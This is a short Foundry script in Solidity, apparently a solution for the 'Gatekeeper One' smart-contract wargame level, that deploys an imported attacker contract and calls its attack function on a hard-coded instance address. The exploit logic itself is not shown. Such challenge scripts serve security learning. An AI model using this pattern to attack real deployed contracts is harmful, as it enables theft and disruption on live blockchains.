//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {AttackGatekeeperOne} from "../src/AttackGateKeeperOne.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackScript is Script {
    address public instance = 0x93a75a7C367108ccDc3874A334e8B0fAD0F8a34E;
    AttackGatekeeperOne attacker;

    function run() public {
        vm.startBroadcast();

        attacker = new AttackGatekeeperOne();
        console.log("Attacker deployed at:", address(attacker));

        attacker.attack(instance);

        vm.stopBroadcast();
    }
}
